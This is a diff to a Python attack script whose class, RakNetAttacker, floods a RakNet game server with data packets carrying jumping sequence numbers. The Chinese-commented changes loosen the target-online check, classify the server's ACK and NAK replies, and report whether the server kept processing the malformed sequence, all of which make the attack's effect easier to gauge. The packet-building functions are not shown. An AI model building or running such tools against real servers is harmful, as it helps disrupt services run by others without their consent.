@@ -79,34 +79,65 @@ class RakNetAttacker:
             return b""
 
     def is_online(self) -> bool:
-        """发送 Unconnected Ping 探测服务端是否在线。"""
+        """
+        宽松在线检测:发送 Unconnected Ping,只要收到任意 UDP 响应即视为在线。
+        (很多服务端禁用 offline ping 或返回非标准 PONG,故不强制检查 0x1C)
+        """
         ts = (int(time.time() * 1000)).to_bytes(8, "big")
         pkt = bytes([ID_UNCONNECTED_PING]) + ts + MAGIC + b"\x00" * 8
         self.send_raw(pkt)
-        resp = self.recv_raw()
-        return bool(resp) and resp[0] == ID_UNCONNECTED_PONG
+        return bool(self.recv_raw())
+
+    @staticmethod
+    def classify(resp: bytes) -> str:
+        """根据响应首字节分类,用于判断服务端是否在处理我们的包。"""
+        if not resp:
+            return "无响应"
+        b = resp[0]
+        if b == ID_UNCONNECTED_PONG:
+            return "Unconnected Pong (offline 探测响应)"
+        if 0xC0 <= b <= 0xC3:
+            return f"ACK (0x{b:02X}, 已确认收到 sequence)"
+        if 0xC4 <= b <= 0xC7:
+            return f"NAK (0x{b:02X}, 否认收到 sequence)"
+        if 0x80 <= b <= 0x8D:
+            return f"DataPacket (0x{b:02X}, 服务端回传数据)"
+        return f"其他 (0x{b:02X})"
 
     def run(self, start: int, end: int, jumps: int) -> None:
-        if self.is_online():
+        online = self.is_online()
+        if online:
             print(f"[+] 目标在线: {self.addr[0]}:{self.addr[1]}")
         else:
-            print(f"[!] 目标 {self.addr[0]}:{self.addr[1]} 未响应 Unconnected Ping,继续尝试...")
+            print(f"[!] 目标 {self.addr[0]}:{self.addr[1]} 未响应 Unconnected Ping")
+            print(f"    (部分服务端禁用 offline ping,继续尝试发送攻击包观察 ACK 响应...)")
 
         seqs = build_jump_sequence(start, end, jumps)
-        print(f"[*] 计划发送 {len(seqs)} 个包,sequence 跳跃序列: {seqs}")
+        print(f"[*] 计划发送 {len(seqs)} 个包,sequence 跳跃序列: {seqs}\n")
 
+        ack_count = 0
         for i, s in enumerate(seqs, 1):
             pkt = build_data_packet(s)
             try:
                 self.send_raw(pkt)
-                print(f"    [{i}/{len(seqs)}] seq={s:>6d} 已发送 -> {len(pkt)} bytes")
+                # 发送后立即尝试接收服务端响应 (ACK/NAK 等)
+                resp = self.recv_raw()
+                kind = self.classify(resp)
+                if resp and 0xC0 <= resp[0] <= 0xC3:
+                    ack_count += 1
+                print(f"    [{i}/{len(seqs)}] seq={s:>6d} 已发送 ({len(pkt)}B) -> 响应: {kind}")
             except Exception as e:
                 print(f"    [{i}/{len(seqs)}] seq={s} 发送异常: {e}")
 
-        # 收尾:观察服务端是否仍在响应
-        time.sleep(0.5)
-        alive = self.is_online()
-        print(f"\n[*] 测试完成,服务端当前 {'在线' if alive else '无响应 / 离线'}")
+        # 收尾:统计服务端处理情况
+        print(f"\n[*] 测试完成")
+        print(f"    发送 {len(seqs)} 个包,收到 {ack_count} 个 ACK 响应")
+        if ack_count > 0:
+            print(f"    结论: 服务端在线且在处理 sequence number")
+        elif online:
+            print(f"    结论: 服务端在线但未对 sequence 跳跃回 ACK (可能已丢弃)")
+        else:
+            print(f"    结论: 服务端全程无响应 (可能离线或被防火墙过滤)")
 
     def close(self) -> None:
         self.sock.close()
